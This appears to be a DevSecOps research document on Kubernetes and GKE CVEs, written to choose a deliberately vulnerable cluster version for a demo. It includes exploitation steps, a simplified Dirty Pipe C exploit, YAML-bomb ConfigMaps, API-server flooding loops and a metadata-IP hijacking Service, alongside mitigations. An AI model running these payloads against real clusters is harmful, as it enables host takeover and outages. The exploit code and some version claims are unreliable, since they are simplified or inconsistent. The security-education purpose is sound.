# Kubernetes / GKE Security Bulletins Research

> **Purpose:** Comprehensive research of Kubernetes and GKE CVEs relevant to container escape,
> master plane (API server) denial-of-service, and privilege escalation scenarios.
> Used to select a deliberately vulnerable Kubernetes version for the DevSecOps demo environment.
>
> **Source:** [GKE Security Bulletins](https://cloud.google.com/kubernetes-engine/security-bulletins)
>
> **Last updated:** 2026-02-18

---

## Table of Contents

1. [Container Escape CVEs](#1-container-escape-cves)
   - [CVE-2019-5736 -- runc Container Escape](#cve-2019-5736--runc-container-escape)
   - [CVE-2020-15257 -- Containerd Host Network Container Escape](#cve-2020-15257--containerd-host-network-container-escape)
   - [CVE-2021-22555 -- Netfilter Heap OOB Write / Container Escape](#cve-2021-22555--netfilter-heap-oob-write--container-escape)
   - [CVE-2022-0185 -- Filesystem Context Integer Underflow / Container Escape](#cve-2022-0185--filesystem-context-integer-underflow--container-escape)
   - [CVE-2022-0847 -- Dirty Pipe / Container Escape](#cve-2022-0847--dirty-pipe--container-escape)
   - [CVE-2024-21626 -- runc Leaked File Descriptor / Container Escape](#cve-2024-21626--runc-leaked-file-descriptor--container-escape)
2. [Master Plane / API Server Crash CVEs](#2-master-plane--api-server-crash-cves)
   - [CVE-2019-11253 -- API Server YAML/JSON Parsing DoS](#cve-2019-11253--api-server-yamljson-parsing-dos)
   - [CVE-2019-11247 -- API Server RBAC Bypass](#cve-2019-11247--api-server-rbac-bypass)
   - [CVE-2019-11248 -- Debug Endpoint Exposure](#cve-2019-11248--debug-endpoint-exposure)
   - [CVE-2020-8559 -- Privilege Escalation via Compromised Node](#cve-2020-8559--privilege-escalation-via-compromised-node)
   - [CVE-2021-25735 -- Admission Webhook Bypass on Node Updates](#cve-2021-25735--admission-webhook-bypass-on-node-updates)
   - [CVE-2021-25741 -- Symlink Exchange / Subpath Volume Bypass](#cve-2021-25741--symlink-exchange--subpath-volume-bypass)
   - [CVE-2022-3172 -- API Server Request Redirection](#cve-2022-3172--api-server-request-redirection)
   - [CVE-2023-5528 -- Windows Node Privilege Escalation via Volume](#cve-2023-5528--windows-node-privilege-escalation-via-volume)
3. [Network and MITM CVEs](#3-network-and-mitm-cves)
   - [CVE-2020-8554 -- MITM via LoadBalancer/ExternalIP](#cve-2020-8554--mitm-via-loadbalancerexternalip)
   - [CVE-2020-8558 -- Route Localnet Bypass](#cve-2020-8558--route-localnet-bypass)
4. [Comprehensive CVE / Version Matrix](#4-comprehensive-cve--version-matrix)
5. [Recommended Kubernetes Version for Demo](#5-recommended-kubernetes-version-for-demo)
6. [Exploitation Details](#6-exploitation-details)
7. [Mitigation Strategies](#7-mitigation-strategies)
8. [References](#8-references)

---

## 1. Container Escape CVEs

These CVEs allow an attacker who has code execution inside a container to break out and gain
access to the underlying host node.

### CVE-2019-5736 -- runc Container Escape

| Field | Details |
|---|---|
| **CVE ID** | CVE-2019-5736 |
| **Published** | 2019-02-11 |
| **CVSS** | 8.6 (High) |
| **Component** | runc (< 1.0-rc6) |
| **GKE Bulletin** | GCP-2019-002 |
| **Attack Vector** | Overwrite host runc binary via `/proc/self/exe` |

**Description:**
A flaw in runc allows a malicious container to overwrite the host `runc` binary by exploiting the
way the container runtime handles `/proc/self/exe`. When a subsequent container is started (or an
`exec` is performed via `docker exec`), the attacker-controlled runc binary executes with root
privileges on the host.

**Affected Kubernetes Versions:**
- All Kubernetes versions using runc < 1.0-rc6
- GKE versions before: 1.10.12-gke.7, 1.11.6-gke.11, 1.11.7-gke.4, 1.12.5-gke.5
- Docker < 18.09.2

**Exploitation Requirements:**
- Ability to run a custom container image (or exec into a container as root)
- The container must run as UID 0 inside the container (default for many images)
- The exploit creates a malicious binary that is executed when runc re-enters the container

**Exploitation Steps:**
1. Attacker runs a container with a malicious entrypoint or execs into a running container
2. Inside the container, the process opens `/proc/self/exe` (which points to the host runc)
3. The process writes a malicious payload to the runc binary via a race condition
4. On next `runc` invocation (e.g., `docker exec`), the malicious binary runs on the host

---

### CVE-2020-15257 -- Containerd Host Network Container Escape

| Field | Details |
|---|---|
| **CVE ID** | CVE-2020-15257 |
| **Published** | 2020-11-30 |
| **CVSS** | 5.2 (Medium) |
| **Component** | containerd < 1.3.9, < 1.4.3 |
| **Attack Vector** | Abstract unix socket access from host-network containers |

**Description:**
Containers running with `hostNetwork: true` could access containerd's abstract unix domain sockets,
allowing them to interact with the containerd API and escape the container sandbox.

**Affected Kubernetes Versions:**
- Any cluster using containerd < 1.3.9 or < 1.4.3 as container runtime
- GKE nodes using containerd-based images prior to patching
- Kubernetes 1.16 - 1.19 (depending on containerd version bundled)

---

### CVE-2021-22555 -- Netfilter Heap OOB Write / Container Escape

| Field | Details |
|---|---|
| **CVE ID** | CVE-2021-22555 |
| **Published** | 2021-07-07 |
| **CVSS** | 7.8 (High) |
| **Component** | Linux Kernel Netfilter (net/netfilter/x_tables.c) |
| **GKE Bulletin** | GCP-2021-015 |
| **Attack Vector** | Heap out-of-bounds write via `setsockopt` on Netfilter |

**Description:**
A heap out-of-bounds write vulnerability in Linux kernel's Netfilter subsystem
(`net/netfilter/x_tables.c`) allows a local user to escalate privileges to root. Because the
exploit targets the kernel directly, it can be used from within a container (even an unprivileged
one) to gain root access on the host node.

**Affected Kubernetes Versions:**
- All GKE node versions running Linux kernel < 5.12 (patched in 5.12)
- GKE versions prior to patched releases in August 2021:
  - 1.18.20-gke.4800 and earlier
  - 1.19.14-gke.600 and earlier
  - 1.20.10-gke.200 and earlier
  - 1.21.3-gke.200 and earlier
- **Linux kernels affected:** 2.6.19 through 5.11.x (the bug existed for 15 years)

**Exploitation Requirements:**
- Local access (container is sufficient)
- CAP_NET_ADMIN within the user namespace, OR an unprivileged user on kernels with user namespaces enabled (default in Ubuntu)
- No special container configuration needed if user namespaces are enabled on the host kernel

**Exploitation Steps:**
1. Create a user namespace (available inside most containers by default)
2. Use `setsockopt()` with `IPT_SO_SET_REPLACE` on a netfilter socket
3. Trigger heap out-of-bounds write by crafting malicious xt_compat structures
4. Corrupt adjacent heap objects to achieve arbitrary code execution in kernel mode
5. Overwrite kernel credentials (cred struct) to escalate to root
6. Access host filesystem and resources as root

---

### CVE-2022-0185 -- Filesystem Context Integer Underflow / Container Escape

| Field | Details |
|---|---|
| **CVE ID** | CVE-2022-0185 |
| **Published** | 2022-01-18 |
| **CVSS** | 8.4 (High) |
| **Component** | Linux Kernel (fs/fs_context.c) -- Filesystem Context |
| **GKE Bulletin** | GCP-2022-002 |
| **Attack Vector** | Integer underflow / heap buffer overflow via `fsconfig` syscall |

**Description:**
A heap-based buffer overflow caused by an integer underflow in the Linux kernel's filesystem
context handling (`legacy_parse_param` in `fs/fs_context.c`). An unprivileged user who can create
user namespaces can exploit this to escape a container and gain root on the host.

**Affected Kubernetes Versions:**
- All GKE node versions running Linux kernel 5.1 through 5.16.1
- GKE versions prior to:
  - 1.21.6-gke.1500 and earlier
  - 1.22.3-gke.1500 and earlier
  - 1.23.x before 1.23.2-gke.1500
- **Linux kernels affected:** 5.1.x through 5.16.1

**Exploitation Requirements:**
- CAP_SYS_ADMIN in a user namespace (achievable from within an unprivileged container if `unshare` is available)
- The kernel must have user namespaces enabled (default on most distributions)
- On GKE, Autopilot clusters blocked this; Standard clusters were vulnerable by default

**Exploitation Steps:**
1. Create a new user namespace via `unshare -Urm`
2. Call `fsconfig()` syscall with a crafted oversized parameter
3. Trigger integer underflow in `legacy_parse_param` leading to heap buffer overflow
4. Use the overflow to corrupt kernel heap metadata
5. Achieve arbitrary kernel code execution
6. Escape container namespaces and access the host

---

### CVE-2022-0847 -- Dirty Pipe / Container Escape

| Field | Details |
|---|---|
| **CVE ID** | CVE-2022-0847 |
| **Published** | 2022-03-07 |
| **CVSS** | 7.8 (High) |
| **Component** | Linux Kernel pipe subsystem |
| **GKE Bulletin** | GCP-2022-008 |
| **Attack Vector** | Overwrite arbitrary read-only files via pipe buffer flag manipulation |

**Description:**
A flaw in the Linux kernel pipe subsystem allows overwriting data in arbitrary read-only files.
This is caused by improper initialization of the `flags` member in the `pipe_buffer` structure.
An unprivileged user can exploit this to write to read-only files backed by the page cache,
including SUID binaries and files on read-only filesystems, leading to privilege escalation.

**Affected Kubernetes Versions:**
- All GKE node versions running Linux kernel 5.8 through 5.16.10 / 5.15.24 / 5.10.101
- GKE versions before patched releases in March 2022:
  - 1.21.x (prior to 1.21.11-gke.900)
  - 1.22.x (prior to 1.22.8-gke.200)
  - 1.23.x (prior to 1.23.5-gke.400)
- **Linux kernels affected:** 5.8 through 5.16.10 (introduced in kernel 5.8 via commit f6dd975583bd)

**Exploitation Requirements:**
- **No special privileges needed** -- this is exploitable by any user/process
- No capabilities, no user namespace creation, no special syscalls needed
- Works from within any container, even heavily restricted ones
- Only needs the ability to `open()`, `read()`, `splice()`, and `write()`

**Exploitation Steps (Container Escape):**
1. From within the container, identify a SUID binary on the host (e.g., `/usr/bin/su`)
2. Open the target file as read-only
3. Create a pipe and fill/drain it to set up the `PIPE_BUF_FLAG_CAN_MERGE` flag
4. Use `splice()` to load the target file's page cache into the pipe
5. Write arbitrary data to the pipe, which overwrites the page cache
6. The SUID binary is now modified -- execute it to gain root on the host
7. Alternatively, overwrite `/etc/passwd` to add a root-equivalent user

**Why this is particularly dangerous:**
- Extremely reliable (no race conditions, no heap spraying)
- Works with minimal privileges
- Simple exploit (< 100 lines of C)
- Affects all containers regardless of security context or seccomp profiles

---

### CVE-2024-21626 -- runc Leaked File Descriptor / Container Escape

| Field | Details |
|---|---|
| **CVE ID** | CVE-2024-21626 |
| **Published** | 2024-01-31 |
| **CVSS** | 8.6 (High) |
| **Component** | runc < 1.1.12 |
| **GKE Bulletin** | GCP-2024-005 |
| **Attack Vector** | Leaked file descriptor to host filesystem via `WORKDIR` |

**Description:**
A flaw in runc allows a container to gain access to the host filesystem through a leaked internal
file descriptor. By setting the `WORKDIR` directive in a Dockerfile to `/proc/self/fd/[N]`, an
attacker could escape the container and access the host filesystem.

**Affected Kubernetes Versions:**
- All clusters using runc < 1.1.12
- GKE versions prior to patches released February 2024
- Kubernetes 1.25 - 1.28 (depending on bundled runc version)

---

## 2. Master Plane / API Server Crash CVEs

These CVEs target the Kubernetes control plane, allowing denial of service or compromise of the
API server itself.

### CVE-2019-11253 -- API Server YAML/JSON Parsing DoS

| Field | Details |
|---|---|
| **CVE ID** | CVE-2019-11253 |
| **Published** | 2019-10-17 |
| **CVSS** | 7.5 (High) |
| **Component** | Kubernetes API Server (YAML/JSON parser) |
| **Attack Vector** | Crafted YAML/JSON payload causing resource exhaustion |

**Description:**
The Kubernetes API server is vulnerable to a denial-of-service attack via specially crafted
YAML or JSON payloads. The API server's YAML parser (`go-yaml`) is susceptible to "billion laughs"
style XML bomb attacks. A malicious user who can send requests to the API server can cause it to
consume excessive CPU and memory, leading to API server crash or unresponsiveness.

**Affected Kubernetes Versions:**
- Kubernetes 1.0 through 1.13.11
- Kubernetes 1.14.0 through 1.14.7
- Kubernetes 1.15.0 through 1.15.4
- Kubernetes 1.16.0 through 1.16.1
- **All versions before the patch** were vulnerable

**Exploitation Requirements:**
- Any authenticated user (even with minimal RBAC permissions)
- Or unauthenticated access if anonymous auth is enabled (common in older clusters)
- Ability to send POST/PUT requests to the API server

**Exploitation Steps:**
1. Craft a YAML payload with deeply nested anchors and aliases ("billion laughs" pattern):
```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: exploit
data:
  a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
  c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
  d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
  e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
  f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
  g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
```
2. Send the payload via `kubectl apply -f` or direct API request
3. The API server attempts to parse and expand the YAML, consuming exponential memory
4. API server becomes unresponsive or crashes due to OOM

---

### CVE-2019-11247 -- API Server RBAC Bypass

| Field | Details |
|---|---|
| **CVE ID** | CVE-2019-11247 |
| **Published** | 2019-08-05 |
| **CVSS** | 8.1 (High) |
| **Component** | Kubernetes API Server (RBAC enforcement) |
| **Attack Vector** | Cluster-scoped resource accessed via namespaced API calls |

**Description:**
The API server incorrectly allowed access to cluster-scoped custom resources through namespaced
API requests, bypassing RBAC policies. This means a user with namespace-level permissions could
read, modify, or delete cluster-scoped custom resources.

**Affected Kubernetes Versions:**
- Kubernetes 1.7.0 through 1.15.2
- Fixed in: 1.13.9, 1.14.5, 1.15.2

---

### CVE-2019-11248 -- Debug Endpoint Exposure

| Field | Details |
|---|---|
| **CVE ID** | CVE-2019-11248 |
| **Published** | 2019-08-05 |
| **CVSS** | 6.5 (Medium) |
| **Component** | Kubernetes API Server / Kubelet debug endpoints |
| **Attack Vector** | `/debug/pprof` endpoint exposed without authentication |

**Description:**
The default Kubernetes configuration exposed `/debug/pprof` endpoints on the kubelet and API
server, potentially leaking sensitive profiling information and enabling DoS by exhausting
resources through profiling requests.

**Affected Kubernetes Versions:**
- Kubernetes < 1.15.0 (kubelet)
- Various versions depending on configuration

---

### CVE-2020-8559 -- Privilege Escalation via Compromised Node

| Field | Details |
|---|---|
| **CVE ID** | CVE-2020-8559 |
| **Published** | 2020-07-22 |
| **CVSS** | 6.4 (Medium) |
| **Component** | Kubernetes API Server (redirect handling) |
| **Attack Vector** | Intercept API server requests via compromised kubelet |

**Description:**
If an attacker compromises a node (kubelet), they can send specially crafted redirect responses
to the API server. The API server follows these redirects, potentially forwarding authenticated
requests to other nodes. This allows lateral movement across the cluster from a single
compromised node to full cluster compromise.

**Affected Kubernetes Versions:**
- Kubernetes 1.0 through 1.15.11
- Kubernetes 1.16.0 through 1.16.9
- Kubernetes 1.17.0 through 1.17.5
- Kubernetes 1.18.0 through 1.18.1

---

### CVE-2021-25735 -- Admission Webhook Bypass on Node Updates

| Field | Details |
|---|---|
| **CVE ID** | CVE-2021-25735 |
| **Published** | 2021-04-14 |
| **CVSS** | 6.5 (Medium) |
| **Component** | Kubernetes API Server (kube-apiserver) |
| **Attack Vector** | TOCTOU bypass on validating admission webhooks during node updates |

**Description:**
A bug in `kube-apiserver` allows bypassing validating admission webhooks for Node objects. An
attacker could modify node properties that should be protected by admission webhooks, potentially
disrupting scheduling or leaking information.

**Affected Kubernetes Versions:**
- Kubernetes 1.18.0 through 1.18.17
- Kubernetes 1.19.0 through 1.19.9
- Kubernetes 1.20.0 through 1.20.5

---

### CVE-2021-25741 -- Symlink Exchange / Subpath Volume Bypass

| Field | Details |
|---|---|
| **CVE ID** | CVE-2021-25741 |
| **Published** | 2021-09-15 |
| **CVSS** | 8.1 (High) |
| **Component** | Kubernetes Kubelet (volume subpath handling) |
| **Attack Vector** | Symlink race to access host filesystem via subpath volumes |

**Description:**
A user may create a container with subpath volume mounts to access files and directories outside
of the volume, including on the host node filesystem. By using a race condition with symlinks,
an attacker can escape the intended volume boundaries.

**Affected Kubernetes Versions:**
- Kubernetes 1.15.0 through 1.19.14
- Kubernetes 1.20.0 through 1.20.10
- Kubernetes 1.21.0 through 1.21.4
- Kubernetes 1.22.0 through 1.22.1

---

### CVE-2022-3172 -- API Server Request Redirection

| Field | Details |
|---|---|
| **CVE ID** | CVE-2022-3172 |
| **Published** | 2022-11-10 |
| **CVSS** | 8.2 (High) |
| **Component** | kube-apiserver aggregated API server |
| **Attack Vector** | Redirect responses from aggregated API servers |

**Description:**
An aggregated API server can redirect client traffic to any URL, potentially leading to
client credential leakage. The API server did not properly validate redirect responses
from aggregated servers.

**Affected Kubernetes Versions:**
- Kubernetes 1.22.0 through 1.22.14
- Kubernetes 1.23.0 through 1.23.11
- Kubernetes 1.24.0 through 1.24.5
- Kubernetes 1.25.0 through 1.25.1

---

### CVE-2023-5528 -- Windows Node Privilege Escalation via Volume

| Field | Details |
|---|---|
| **CVE ID** | CVE-2023-5528 |
| **Published** | 2023-11-14 |
| **CVSS** | 7.2 (High) |
| **Component** | Kubernetes Kubelet (Windows volume handling) |
| **Attack Vector** | Command injection via volume names on Windows nodes |

**Description:**
A command injection vulnerability in kubelet on Windows nodes through volume names in pod
specifications. Applicable only to Windows-based node pools.

**Affected Kubernetes Versions:**
- Kubernetes 1.24.0 through 1.24.17
- Kubernetes 1.25.0 through 1.25.15
- Kubernetes 1.26.0 through 1.26.10
- Kubernetes 1.27.0 through 1.27.7
- Kubernetes 1.28.0 through 1.28.3

---

## 3. Network and MITM CVEs

### CVE-2020-8554 -- MITM via LoadBalancer/ExternalIP

| Field | Details |
|---|---|
| **CVE ID** | CVE-2020-8554 |
| **Published** | 2020-12-07 |
| **CVSS** | 5.0 (Medium) |
| **Component** | Kubernetes Service / kube-proxy |
| **GKE Bulletin** | GCP-2020-015 |
| **Attack Vector** | Service ExternalIP MITM |

**Description:**
A user who can create or update a Kubernetes Service with `spec.externalIPs` or change a Service
type to `LoadBalancer` can intercept traffic destined for cluster IPs. kube-proxy installs
iptables rules for ExternalIPs without validation, allowing man-in-the-middle attacks on
any cluster traffic.

**Affected Kubernetes Versions:**
- **All Kubernetes versions** (this is a design-level issue)
- No full fix released; mitigations via admission controllers recommended
- GKE mitigated by restricting ExternalIP usage via admission webhook

**Exploitation Requirements:**
- Permission to create/update Services in any namespace
- The Service spec must be allowed to include `externalIPs`

---

### CVE-2020-8558 -- Route Localnet Bypass

| Field | Details |
|---|---|
| **CVE ID** | CVE-2020-8558 |
| **Published** | 2020-07-08 |
| **CVSS** | 5.4 (Medium) |
| **Component** | kube-proxy |
| **Attack Vector** | Access node-local services from adjacent pods |

**Description:**
kube-proxy sets `net.ipv4.conf.all.route_localnet=1`, which allows pods to access services bound
to `127.0.0.1` on the node. This can expose the kubelet API, metadata API, and other sensitive
node-local services to containers.

**Affected Kubernetes Versions:**
- Kubernetes 1.0 through 1.16.10
- Kubernetes 1.17.0 through 1.17.6
- Kubernetes 1.18.0 through 1.18.3

---

## 4. Comprehensive CVE / Version Matrix

The following matrix shows which Kubernetes versions are vulnerable to each CVE. This helps
identify the optimal version for demonstrating multiple vulnerabilities simultaneously.

| CVE | Category | K8s 1.16 | K8s 1.17 | K8s 1.18 | K8s 1.19 | K8s 1.20 | K8s 1.21 | K8s 1.22 | K8s 1.23 |
|-----|----------|----------|----------|----------|----------|----------|----------|----------|----------|
| CVE-2019-5736 (runc escape) | Container Escape | Fixed | Fixed | Fixed | Fixed | Fixed | Fixed | Fixed | Fixed |
| CVE-2021-22555 (netfilter) | Container Escape | VULN | VULN | VULN | VULN | VULN | VULN* | Fixed | Fixed |
| CVE-2022-0185 (fs_context) | Container Escape | N/A | N/A | VULN | VULN | VULN | VULN | VULN* | Fixed |
| CVE-2022-0847 (Dirty Pipe) | Container Escape | N/A | N/A | N/A | VULN | VULN | VULN | VULN* | VULN* |
| CVE-2019-11253 (YAML bomb) | API Server DoS | VULN* | Fixed | Fixed | Fixed | Fixed | Fixed | Fixed | Fixed |
| CVE-2020-8559 (node redirect) | API Server | VULN | VULN | VULN* | Fixed | Fixed | Fixed | Fixed | Fixed |
| CVE-2020-8554 (ExternalIP MITM) | Network | VULN | VULN | VULN | VULN | VULN | VULN | VULN | VULN |
| CVE-2020-8558 (localnet bypass) | Network | VULN | VULN* | VULN* | Fixed | Fixed | Fixed | Fixed | Fixed |
| CVE-2021-25741 (symlink escape) | Volume Escape | N/A | N/A | N/A | VULN | VULN | VULN | VULN* | Fixed |
| CVE-2021-25735 (webhook bypass) | API Server | N/A | N/A | VULN | VULN | VULN* | Fixed | Fixed | Fixed |

**Legend:**
- `VULN` = Vulnerable (all patch versions)
- `VULN*` = Vulnerable in early patch versions, fixed in later ones
- `Fixed` = Patched in all or most patch versions
- `N/A` = Vulnerability does not apply (kernel too old, or feature not present)

> **Note on kernel-level CVEs:** CVE-2021-22555, CVE-2022-0185, and CVE-2022-0847 depend on the
> node's Linux kernel version, not Kubernetes version directly. However, GKE node images bundle
> specific kernel versions with each GKE release, so the mapping above reflects GKE's bundled
> kernels.

---

## 5. Recommended Kubernetes Version for Demo

### Primary Recommendation: Kubernetes 1.18.x (GKE 1.18.12-gke.1200 or earlier)

**Rationale:**
Kubernetes 1.18 (early patch versions) sits at the optimal intersection of vulnerabilities,
providing exposure to both container escape AND master plane attack vectors:

| Vulnerability | Status on 1.18.x (early) |
|---|---|
| CVE-2021-22555 (Netfilter container escape) | **VULNERABLE** -- kernel too old for fix |
| CVE-2022-0185 (fs_context container escape) | **VULNERABLE** -- affected kernel range |
| CVE-2020-8559 (API server node redirect) | **VULNERABLE** -- fixed in 1.18.1+, use 1.18.0 |
| CVE-2020-8554 (ExternalIP MITM) | **VULNERABLE** -- all versions |
| CVE-2020-8558 (localnet bypass) | **VULNERABLE** -- fixed in 1.18.3+ |
| CVE-2021-25735 (webhook bypass) | **VULNERABLE** -- all 1.18 versions |
| CVE-2021-25741 (symlink volume escape) | Not applicable (introduced later) |
| CVE-2019-11253 (API server YAML DoS) | Fixed (patched before 1.18) |

### Secondary Recommendation: Kubernetes 1.19.x (GKE 1.19.8-gke.1400 or earlier)

If 1.18 is not available in GKE, version 1.19 (early patches) provides an even broader attack surface:

| Vulnerability | Status on 1.19.x (early) |
|---|---|
| CVE-2021-22555 (Netfilter container escape) | **VULNERABLE** |
| CVE-2022-0185 (fs_context container escape) | **VULNERABLE** |
| CVE-2022-0847 (Dirty Pipe) | **VULNERABLE** (if kernel >= 5.8) |
| CVE-2020-8554 (ExternalIP MITM) | **VULNERABLE** |
| CVE-2021-25741 (symlink volume escape) | **VULNERABLE** |
| CVE-2021-25735 (webhook bypass) | **VULNERABLE** |
| CVE-2019-11253 (API server YAML DoS) | Fixed |

### Tertiary Recommendation: Kubernetes 1.21.x (GKE 1.21.5-gke.1200 or earlier)

If you need the widest container escape surface including Dirty Pipe:

| Vulnerability | Status on 1.21.x (early) |
|---|---|
| CVE-2021-22555 (Netfilter container escape) | **VULNERABLE** (before 1.21.3-gke.200) |
| CVE-2022-0185 (fs_context container escape) | **VULNERABLE** (before 1.21.6-gke.1500) |
| CVE-2022-0847 (Dirty Pipe) | **VULNERABLE** (before 1.21.11-gke.900) |
| CVE-2020-8554 (ExternalIP MITM) | **VULNERABLE** |
| CVE-2021-25741 (symlink volume escape) | **VULNERABLE** (before 1.21.4) |

### GKE Availability Considerations

> **IMPORTANT:** GKE enforces version lifecycle policies. Very old versions (< 1.21) may
> no longer be available for cluster creation. As of 2024-2025, the oldest typically
> available regular channel version is around 1.27.x. To use older versions:
>
> 1. **Rapid channel with specific version:** May allow slightly older versions
> 2. **No auto-upgrade:** Disable auto-upgrade to prevent automatic patching
> 3. **Static GKE version:** Use `--cluster-version` flag with an exact version
> 4. **Consider self-managed Kubernetes:** For versions older than GKE supports, use
>    kubeadm on GCE VMs with a specific K8s and kernel version
>
> For the demo, if restricted to currently available GKE versions, choose the **oldest available
> version** and supplement with unpatched node images or custom node pools running vulnerable
> kernels.

### Best Approach for the Demo

Given GKE lifecycle constraints, the **recommended approach** is:

1. **GKE cluster:** Use the oldest available GKE version (likely 1.27 or 1.28 range)
2. **Container escape demo:** Use a deliberately vulnerable container that simulates kernel
   exploits, OR deploy on a custom node pool with an older Ubuntu/COS image
3. **API server crash demo:** Use CVE-2019-11253 style YAML bombs (may still work partially on
   newer versions depending on resource limits), or demonstrate via excessive API requests
4. **Network MITM demo:** CVE-2020-8554 is still relevant as it has no complete upstream fix

---

## 6. Exploitation Details

### 6.1 Container Escape via Dirty Pipe (CVE-2022-0847)

This is the most reliable and dramatic container escape for demos.

```c
// dirty_pipe_escape.c -- Simplified exploit concept
// Overwrites a SUID binary to gain root on the host

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define SUID_BINARY "/usr/bin/su"  // Target on the host

int main() {
    // 1. Open the target SUID binary (read-only is sufficient)
    int fd = open(SUID_BINARY, O_RDONLY);

    // 2. Create a pipe
    int pipefd[2];
    pipe(pipefd);

    // 3. Fill and drain the pipe to set PIPE_BUF_FLAG_CAN_MERGE
    char buf[4096];
    for (int i = 0; i < 16; i++) {
        write(pipefd[1], buf, sizeof(buf));
        read(pipefd[0], buf, sizeof(buf));
    }

    // 4. Splice the target file into the pipe (loads page cache)
    loff_t offset = 0;  // or offset to the ELF entry point
    splice(fd, &offset, pipefd[1], NULL, 1, 0);

    // 5. Write exploit payload (overwrites page cache)
    char payload[] = "#!/bin/sh\nid > /tmp/pwned\nchmod 777 /tmp/pwned\n";
    write(pipefd[1], payload, sizeof(payload));

    // 6. Execute the now-modified SUID binary
    execl(SUID_BINARY, SUID_BINARY, NULL);

    return 0;
}
```

**Pod specification for testing:**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-test
  namespace: default
spec:
  containers:
  - name: attacker
    image: ubuntu:20.04
    command: ["sleep", "infinity"]
    securityContext:
      # Even with these restrictions, Dirty Pipe works
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: false
```

### 6.2 API Server DoS via YAML Bomb (CVE-2019-11253)

```yaml
# yaml_bomb.yaml -- "Billion Laughs" attack on Kubernetes API server
# WARNING: This will crash or hang a vulnerable API server
apiVersion: v1
kind: ConfigMap
metadata:
  name: yaml-bomb
  namespace: default
data:
  lol1: &lol1 "lollollollollollollollollollol"
  lol2: &lol2 [*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1]
  lol3: &lol3 [*lol2,*lol2,*lol2,*lol2,*lol2,*lol2,*lol2,*lol2,*lol2,*lol2]
  lol4: &lol4 [*lol3,*lol3,*lol3,*lol3,*lol3,*lol3,*lol3,*lol3,*lol3,*lol3]
  lol5: &lol5 [*lol4,*lol4,*lol4,*lol4,*lol4,*lol4,*lol4,*lol4,*lol4,*lol4]
  lol6: &lol6 [*lol5,*lol5,*lol5,*lol5,*lol5,*lol5,*lol5,*lol5,*lol5,*lol5]
  lol7: &lol7 [*lol6,*lol6,*lol6,*lol6,*lol6,*lol6,*lol6,*lol6,*lol6,*lol6]
  lol8: &lol8 [*lol7,*lol7,*lol7,*lol7,*lol7,*lol7,*lol7,*lol7,*lol7,*lol7]
  lol9: &lol9 [*lol8,*lol8,*lol8,*lol8,*lol8,*lol8,*lol8,*lol8,*lol8,*lol8]
```

**Execution:**
```bash
# Attempt to apply the YAML bomb
kubectl apply -f yaml_bomb.yaml

# Monitor API server health
kubectl get --raw /healthz
kubectl get --raw /readyz
```

### 6.3 API Server Crash via Malformed Requests

For newer Kubernetes versions where CVE-2019-11253 is patched, alternative API server stress
methods include:

```bash
# 1. Excessive watch requests (resource exhaustion)
for i in $(seq 1 1000); do
  kubectl get pods --watch &
done

# 2. Large object creation (etcd pressure)
kubectl create configmap large-cm --from-literal=key="$(head -c 1048576 /dev/urandom | base64)"

# 3. Rapid namespace creation/deletion (control loop stress)
for i in $(seq 1 500); do
  kubectl create namespace stress-test-$i &
done

# 4. CRD with excessive validation schema (webhook exhaustion)
# Apply a CRD with deeply nested OpenAPI schema validation
```

### 6.4 ExternalIP MITM (CVE-2020-8554)

```yaml
# mitm_service.yaml -- Intercept traffic destined for a specific IP
apiVersion: v1
kind: Service
metadata:
  name: mitm-service
  namespace: attacker-ns
spec:
  selector:
    app: attacker-pod
  ports:
  - port: 443
    targetPort: 8443
  # Hijack traffic to the cluster's metadata server
  externalIPs:
  - "169.254.169.254"  # GCE metadata endpoint
```

---

## 7. Mitigation Strategies

### 7.1 Container Escape Mitigations

| Mitigation | Addresses | Implementation |
|---|---|---|
| **Keep nodes patched** | All kernel CVEs | Enable GKE auto-upgrade, use latest node images |
| **GKE Sandbox (gVisor)** | All container escapes | Add `sandbox_config { type: gvisor }` to node pool |
| **Seccomp profiles** | CVE-2021-22555, CVE-2022-0185 | Apply RuntimeDefault or custom seccomp profiles |
| **Drop all capabilities** | CVE-2021-22555 | Set `securityContext.capabilities.drop: ["ALL"]` |
| **Disable user namespaces** | CVE-2022-0185 | Set `kernel.unprivileged_userns_clone=0` on nodes |
| **Read-only root filesystem** | Limits post-escape impact | Set `readOnlyRootFilesystem: true` |
| **Non-root containers** | CVE-2019-5736 | Set `runAsNonRoot: true`, `runAsUser: 1000` |
| **Pod Security Standards** | Multiple | Enforce `restricted` PodSecurity standard |
| **Falco runtime detection** | All escapes (detection) | Deploy Falco with container escape rule sets |
| **Trivy image scanning** | Known vulnerable images | Scan images for CVEs before deployment |

**Pod Security Context (hardened):**
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 65534
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  seccompProfile:
    type: RuntimeDefault
  capabilities:
    drop: ["ALL"]
```

### 7.2 API Server / Master Plane Mitigations

| Mitigation | Addresses | Implementation |
|---|---|---|
| **Request size limits** | CVE-2019-11253 | Configure `--max-request-bytes` on API server |
| **Rate limiting** | DoS attacks | Use `APIPriorityAndFairness` (enabled by default >= 1.20) |
| **RBAC least privilege** | CVE-2019-11247, CVE-2020-8559 | Minimal roles, no wildcard permissions |
| **Disable anonymous auth** | CVE-2019-11253 | Set `--anonymous-auth=false` |
| **Audit logging** | All API server attacks | Enable audit logs with comprehensive policy |
| **Network policies** | Lateral movement | Restrict pod-to-API-server communication |
| **Authorized networks** | External attacks | Configure GKE master authorized networks |
| **Private cluster** | External attacks | Use private GKE clusters |

### 7.3 Network Mitigations

| Mitigation | Addresses | Implementation |
|---|---|---|
| **ExternalIP admission controller** | CVE-2020-8554 | Deploy `DenyServiceExternalIPs` admission controller |
| **Network Policies** | CVE-2020-8558, general | Apply default-deny network policies |
